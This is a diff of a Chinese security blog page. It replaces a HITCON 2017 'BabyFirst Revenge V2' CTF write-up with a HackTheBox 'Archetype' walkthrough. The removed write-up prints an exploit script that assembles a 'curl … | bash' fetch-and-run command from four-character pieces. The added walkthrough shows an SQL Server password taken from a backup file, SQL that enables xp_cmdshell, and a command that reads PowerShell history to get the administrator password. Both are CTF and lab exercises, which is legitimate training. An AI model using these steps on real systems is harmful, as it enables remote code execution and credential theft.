@@ -6,7 +6,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
-    <title>[hitcon2017] BabyFirst Revenge V2复现 | Pr0ph3t's blog</title>
+    <title>[HTB] Starting Point {1} | Pr0ph3t's blog</title>
 
     <!-- Bootstrap -->
     <link rel="stylesheet" href="/assets/css/bootstrap-3.3.6/css/bootstrap.min.css">
@@ -70,7 +70,7 @@
             <div class="post">
 
   <header class="post-header">
-    <h1>[hitcon2017] BabyFirst Revenge V2复现</h1>
+    <h1>[HTB] Starting Point {1}</h1>
   </header>
 
   <article class="post-content">
@@ -78,13 +78,13 @@
 
   <header class="post-header">
     <p class="meta">
-        Nov 28, 2017
+        Dec 27, 2020
         
         
         •
-        <span><a href="/category/#CyberSecurity" class="reserved">CyberSecurity</a>,</span><span><a href="/category/#writeup" class="reserved">writeup</a>,</span><span><a href="/category/#hitcon" class="reserved">hitcon</a>,</span><span><a href="/category/#old" class="reserved">old</a></span>
+        <span><a href="/category/#CyberSecurity" class="reserved">CyberSecurity</a>,</span><span><a href="/category/#HackTheBox" class="reserved">HackTheBox</a></span>
         
-          <span id="/posts/hitcon2017-BabyFirst-Revenge-V2%E5%A4%8D%E7%8E%B0/" class="leancloud_visitors" data-flag-title="[hitcon2017] BabyFirst Revenge V2复现">
+          <span id="/posts/HTB-Starting-Point-1/" class="leancloud_visitors" data-flag-title="[HTB] Starting Point {1}">
             Page view:
             <span class="leancloud-visitors-count"></span>
           </span>
@@ -93,112 +93,109 @@
   </header>
 
   <article class="post-content">
-  <p>分享本题自制Dockerfile：<a href="https://github.com/Pr0phet/hitcon2017Dockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge-v2">Github</a></p>
+  <blockquote>
+  <p>HackTheBox 启动！</p>
+</blockquote>
 
-<p>这题相比于上一题 条件更加的苛刻了 只允许执行最多四个字符
-源码如下：</p>
+<p>首先基础的信息收集，使用nmap做基础的端口和系统扫描</p>
 
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
-    <span class="nv">$sandbox</span> <span class="o">=</span> <span class="s1">'/www/sandbox/'</span> <span class="mf">.</span> <span class="nb">md5</span><span class="p">(</span><span class="s2">"orange"</span> <span class="mf">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]);</span>
-    <span class="o">@</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
-    <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
-        <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
-    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'reset'</span><span class="p">]))</span> <span class="p">{</span>
-        <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="s1">'/bin/rm -rf '</span> <span class="mf">.</span> <span class="nv">$sandbox</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-Pn</span> 10.10.10.27
+
+Nmap scan report <span class="k">for </span>10.10.10.27
+Host is up <span class="o">(</span>0.21s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 996 closed ports
+PORT     STATE SERVICE      VERSION
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
+1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00<span class="p">;</span> RTM
+| ms-sql-ntlm-info:
+|   Target_Name: ARCHETYPE
+|   NetBIOS_Domain_Name: ARCHETYPE
+|   NetBIOS_Computer_Name: ARCHETYPE
+|   DNS_Domain_Name: Archetype
+|   DNS_Computer_Name: Archetype
+|_  Product_Version: 10.0.17763
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+| Not valid before: 2020-12-26T13:02:11
+|_Not valid after:  2050-12-26T13:02:11
+|_ssl-date: 2020-12-26T13:15:30+00:00<span class="p">;</span> +16m36s from scanner time.
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h52m36s, deviation: 3h34m41s, median: 16m35s
+| ms-sql-info:
+|   10.10.10.27:1433:
+|     Version:
+|       name: Microsoft SQL Server 2017 RTM
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 2017
+|       Service pack level: RTM
+|       Post-SP patches applied: <span class="nb">false</span>
+|_    TCP port: 1433
+| smb-os-discovery:
+|   OS: Windows Server 2019 Standard 17763 <span class="o">(</span>Windows Server 2019 Standard 6.3<span class="o">)</span>
+|   Computer name: Archetype
+|   NetBIOS computer name: ARCHETYPE<span class="se">\x</span>00
+|   Workgroup: WORKGROUP<span class="se">\x</span>00
+|_  System <span class="nb">time</span>: 2020-12-26T05:15:20-08:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   <span class="nb">date</span>: 2020-12-26T13:15:19
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>90.82 seconds
 </code></pre></div></div>
 
-<p>那我们之前的生成 ls -t&gt;g 就不能按照最后一步 ls»_ 来执行了</p>
+<p>发现域Archetype，135、139、445端口开放，使用探测一下SMB服务。
+<img src="https://i.loli.net/2020/12/27/HoYUWhM6XLq1uxp.png" alt="SMB.png" /></p>
 
-<p>但是我们能不能还是按照 生成命令段文件 最后通过ls来拼接命令执行呢？</p>
+<p>逐个尝试，发现backups允许匿名访问
+<img src="https://i.loli.net/2020/12/27/AHUKocJLMyXqPI9.png" alt="backups.png" /></p>
 
-<p>这里还是以分析Orange大大的exp为主：</p>
-
-<p>Exp:</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
-<span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">quote</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="p">[</span>
-    <span class="c1"># generate "g&gt; ht- sl" to file "v"
-</span>    <span class="s">'&gt;dir'</span><span class="p">,</span> 
-    <span class="s">'&gt;sl'</span><span class="p">,</span> 
-    <span class="s">'&gt;g\&gt;'</span><span class="p">,</span>
-    <span class="s">'&gt;ht-'</span><span class="p">,</span>
-    <span class="s">'*&gt;v'</span><span class="p">,</span>
-
-    <span class="c1"># reverse file "v" to file "x", content "ls -th &gt;g"
-</span>    <span class="s">'&gt;rev'</span><span class="p">,</span>
-    <span class="s">'*v&gt;x'</span><span class="p">,</span>
-
-    <span class="c1"># generate "curl orange.tw|python;"
-</span>    <span class="c1"># generate "curl 10.188.2.20|bash"
-</span>    <span class="s">'&gt;\;</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
-    <span class="s">'&gt;sh</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
-    <span class="s">'&gt;ba</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
-    <span class="s">'&gt;\|</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
-    <span class="s">'&gt;20</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
-    <span class="s">'&gt;2.</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span>
-    <span class="s">'&gt;8.</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
-    <span class="s">'&gt;18</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
-    <span class="s">'&gt;0.</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
-    <span class="s">'&gt;1</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
-    <span class="s">'&gt;\ </span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
-    <span class="s">'&gt;rl</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
-    <span class="s">'&gt;cu</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> 
-
-    <span class="c1"># got shell
-</span>    <span class="s">'sh x'</span><span class="p">,</span> 
-    <span class="s">'sh g'</span><span class="p">,</span> 
-<span class="p">]</span>
-
-
-<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://10.188.2.20:17528/?reset=1'</span><span class="p">)</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
-    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">4</span>
-    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://10.188.2.20:17528/?cmd='</span> <span class="o">+</span> <span class="n">quote</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="p">)</span>
-    <span class="k">print</span> <span class="n">i</span>
-    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+<p>直接挂载到本地，只有只读权限，里面存有一个SQL Server的SSIS文件，查看发现SQL Server的密码备份</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;DTSConfiguration&gt;</span>
+    <span class="nt">&lt;DTSConfigurationHeading&gt;</span>
+        <span class="nt">&lt;DTSConfigurationFileInfo</span> <span class="na">GeneratedBy=</span><span class="s">"..."</span> <span class="na">GeneratedFromPackageName=</span><span class="s">"..."</span> <span class="na">GeneratedFromPackageID=</span><span class="s">"..."</span> <span class="na">GeneratedDate=</span><span class="s">"20.1.2019 10:01:34"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;/DTSConfigurationHeading&gt;</span>
+    <span class="nt">&lt;Configuration</span> <span class="na">ConfiguredType=</span><span class="s">"Property"</span> <span class="na">Path=</span><span class="s">"\Package.Connections[Destination].Properties[ConnectionString]"</span> <span class="na">ValueType=</span><span class="s">"String"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;ConfiguredValue&gt;</span>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;<span class="nt">&lt;/ConfiguredValue&gt;</span>
+    <span class="nt">&lt;/Configuration&gt;</span>
+<span class="nt">&lt;/DTSConfiguration&gt;</span>
 </code></pre></div></div>
+<p>直接连接1433，查看用户权限，发现在sysadmin组里，可以调用xp_cmdshell
+<img src="https://i.loli.net/2020/12/27/Zdgrm192RIOpJoD.png" alt="SQL Server.png" /></p>
 
-<p>首先生成 ls -t &gt;g的命令文件，这里orange大大的方法真的巧妙到极致了！</p>
+<p>然后调用getshell一把梭</p>
+<pre><code class="language-SQL">EXEC sp_configure 'Show Advanced Options', 1;
+reconfigure;
+sp_configure;
+EXEC sp_configure 'xp_cmdshell', 1;
+reconfigure;
+xp_cmdshell "whoami";
+</code></pre>
+<p><img src="https://i.loli.net/2020/12/27/6huv4Rwj3MspodC.png" alt="whoami.png" /></p>
 
-<ul>
-  <li>
-    <p>先了解一个小trick，<code class="language-plaintext highlighter-rouge">*</code>在Linux中代表的是0或多个字符，比如<code class="language-plaintext highlighter-rouge">ls *.txt</code> 就表示了列出本目录下所有后缀名为txt的文件，那假如单独执行一个<code class="language-plaintext highlighter-rouge">*</code>会是什么效果？
-在本地尝试了一下 直接输入一个星号的话Linux首先会把当前目录下的所有文件按字典序排序一次，然后将排序的结果当作命令执行，如下：
-<img src="/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-V2复现/1.png" alt="🌰" />
-那下图的也可以理解了：
-<img src="/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-V2复现/2.png" alt="🌰" />
-因为*o匹配了 echo 和o，而他们的排序是echo在前，o在后 所以就会执行命令 echo o</p>
-  </li>
-  <li>
-    <p>再认识一下dir 这个命令在大多数系统中都是ls 的alias 但是有些系统中则没有
-为什么我们要用这个命令呢 因为之前说过ls 是alphabetically （字典序）那么dir就会排在ls结果的最前面 所以我们*之后dir也是排在最前面 也就充当了拼接文件名的角色</p>
-  </li>
-  <li>
-    <p>大概思路就出来了 我们要构造ls -t&gt;g的命令片段成几个文件名 但是其命令段的首字母不能在d的前面，也就是不能是 <strong>特殊符号 数字 abc</strong> 而且每一段不能超过两个字符，因为其余两个字符要分配给&gt;和\，如果你尝试一下构造 正常来说是没办法构造出无特殊符号打头的文件名 他总会排到dir的前面，然后更巧妙的地方来了 我们可以生成逆序的命令拼接起来，最后使用rev命令反向文件中的字符串！</p>
-  </li>
-  <li>
-    <p>根据之前我们对*的认识，我们可以将倒序的命令输入到v文件中，因为*v能匹配rev 和 v，也就是执行了 rev v命令，然后再将倒序之后的结果&gt;x文件中，这样*v&gt;x刚刚好是四个字符!</p>
-  </li>
-  <li>
-    <p>但是看到这里 你可能还会在尝试过程中发现问题，那就是逆序之后的命令段应该是 [dir,&gt;sl,&gt;g&gt;,&gt;t-] 那么这里会有一个问题 因为t的字母序比s后，所以ls之后应该是这样的：
-<img src="/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-V2复现/3.png" alt="Oops" />
-解决方法是加多一个参数h，在ls中h是用作格式化l参数之后的存储量大小 使之更适合人类方式阅读 但是如果ls只带参数h的不带参数l话那这个参数是毫无意义的 如图：
-<img src="/assets/images/posts/2017/hitcon2017-BabyFirst-Revenge-V2复现/4.png" alt="🌰" />
-所以我们将&gt;t-改成&gt;ht-就能解决字典序的问题了</p>
-  </li>
-  <li>
-    <p>接下来的问题就回到了babyfirst-revenge的情况了</p>
-  </li>
-</ul>
+<p>查看<code class="language-plaintext highlighter-rouge">sql_svc</code>用户桌面<code class="language-plaintext highlighter-rouge">user.txt</code>获得user flag
+接下来就是提权，因为靶机有文件监控，一上传文件就会删除，所以没办法很好的通过文件落地的方式提权和做进一步的渗透。
+查看用户的<code class="language-plaintext highlighter-rouge">powershell</code>命令记录，能得到他用<code class="language-plaintext highlighter-rouge">administrator</code>挂载磁盘的命令记录，从而得到<code class="language-plaintext highlighter-rouge">administrator</code>的密码</p>
+<pre><code class="language-cmd">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+</code></pre>
+<p><img src="https://i.loli.net/2020/12/27/ajpRxVowftseyIP.png" alt="history.png" /></p>
 
-<p>参考:
-https://github.com/orangetw/My-CTF-Web-Challenges</p>
+<p>使用<a href="https://github.com/SecureAuthCorp/impacket">Impacket工具集</a>中的<code class="language-plaintext highlighter-rouge">psexec.py</code>连接后得到<code class="language-plaintext highlighter-rouge">system</code>的<code class="language-plaintext highlighter-rouge">shell</code></p>
+<blockquote>
+  <p>这里其实理论上也可以使用msf的psexec，但是不知道为什么我不能反弹回shell或者执行命令（可能是和文件落地有关？）
+最后读取<code class="language-plaintext highlighter-rouge">administrator</code>桌面下的<code class="language-plaintext highlighter-rouge">root.txt</code>得到root flag</p>
+</blockquote>
 
   </article>
 
@@ -211,7 +208,7 @@ https://github.com/orangetw/My-CTF-Web-Challenges</p>
     /* * * CONFIGURATION VARIABLES * * */
     var disqus_shortname = 'pr0ph3t';
     var disqus_config = function () {
-        this.page.identifier = "/posts/hitcon2017-BabyFirst-Revenge-V2%E5%A4%8D%E7%8E%B0/";
+        this.page.identifier = "/posts/HTB-Starting-Point-1/";
     };
     
     /* * * DON'T EDIT BELOW THIS LINE * * */
